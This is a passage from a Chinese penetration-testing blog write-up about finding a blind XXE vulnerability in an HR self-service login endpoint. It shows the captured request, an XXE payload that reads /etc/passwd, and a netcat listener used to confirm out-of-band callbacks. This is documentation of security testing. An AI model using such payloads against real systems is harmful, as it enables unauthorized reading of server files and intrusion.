<pre><code class="prism language-xml">__type=updateData&amp;__viewInstanceId=nc.bs.hrss.login.Login~nc.bs.hrss.login.LoginViewModel&amp;__xml=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rpc</span> <span class="token attr-name">transaction</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>checkPwd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>def</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dataset</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Custom<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dsLogin<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>f</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HRSS_LOGIN_USER<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>f</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>f</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HRSS_LOGIN_USER_ENCODED<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>f</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>f</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HRSS_LOGIN_PSWD<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>f</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>f</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HRSS_LOGIN_IDCODE<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>f</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>f</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HRSS_DATA_SOURCE<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>f</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>f</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ACCOUNT_NAME<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>f</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>f</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HRSS_LANG_CODE<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>f</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dataset</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>def</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>data</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rs</span> <span class="token attr-name">dataset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dsLogin<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>r</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>598<span class="token punctuation">"</span></span> <span class="token attr-name">state</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>insert<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>n</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>v</span><span class="token punctuation">&gt;</span></span>123123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>v</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>v</span><span class="token punctuation">&gt;</span></span>123123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>v</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>v</span><span class="token punctuation">&gt;</span></span>123123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>v</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>v</span><span class="token punctuation">&gt;</span></span>9955<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>v</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>v</span><span class="token punctuation">&gt;</span></span>MCHR<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>v</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>v</span><span class="token punctuation">&gt;</span></span>%u7F8E%u627F%u96C6%u56E2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>v</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>v</span><span class="token punctuation">&gt;</span></span>simpchn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>v</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>n</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>r</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rs</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>data</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>vps</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>DEFAULT_DATA_SOURCE<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>MCHR<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>vps</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rpc</span><span class="token punctuation">&gt;</span></span>&amp;1433050683284
</code></pre> 
<p>4、替换整个 __xml 参数的内容为：</p> 
<pre><code class="prism language-xml"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foo</span><span class="token punctuation">&gt;</span></span>%26xxe;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foo</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>尝试读取 Linux 文件系统的 /etc/passwd，提交后效果：<br> <img src="https://images2.imgbox.com/8b/84/PPrlzTLQ_o.png" alt="在这里插入图片描述"></p> 
<p>5、上面读取不存在的文件会回显找不到路径，下面读 win.ini 成功，确定存在 XXE 盲注：<br> <img src="https://images2.imgbox.com/2e/38/t4EVmMI7_o.png" alt="在这里插入图片描述">6、接下来我们尝试发送一个 get 请求，来请求我映射到公网 ip 的 80 端口。本地<code>nc -lvvp 80</code>，再通过路由器做 NAT 配置：<br> <img src="https://images2.imgbox.com/4c/84/4GaUDOlY_o.png" alt="在这里插入图片描述"><br> 提交以下 Payload，成功收到连接请求：<br> <img src="https://images2.imgbox.com/33/bd/vTtOMX46_o.png" alt="在这里插入图片描述">到这里我们可以证明这个 blind xxe 漏洞存在。</p> 
<h2><a id="_197"></a>总结</h2> 
<p>渗透测试过程中要仔细观察每个数据报文，对疑似的功能点均进行测试！文末补充几个这两天看到的有意思的几个 SRC 实战案例：</p> 
<ol><li>4位数短信验证码的漏洞：<a href="https://lynnlovemin.blog.csdn.net/article/details/109447463" rel="nofollow">某平台后台系统存在任意账号密码重置漏洞</a>；</li><li>4位数短信验证码的漏洞：<a href="https://lynnlovemin.blog.csdn.net/article/details/108982280" rel="nofollow">浅析一次任意用户注册漏洞挖掘过程</a>；</li><li>CSRF漏洞如何结合社工变为致命漏洞：<a href="https://mp.weixin.qq.com/s/-ocX-SzwODJAbfNYUkO2-Q" rel="nofollow">实战 | CSRF拿下盗图狗后台 </a>。</li></ol>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/4e7d03089033fc7d376107e14324532c/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">鸿蒙系统手机电脑互传文件,华为手机怎么与电脑互传文件（Huawei Share教程</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/57148227887c0b9c0c11e5a32090b69d/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">k30pro刷鸿蒙,事实证明Redmi K30Pro确实可实现高刷，但有利也有弊！</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>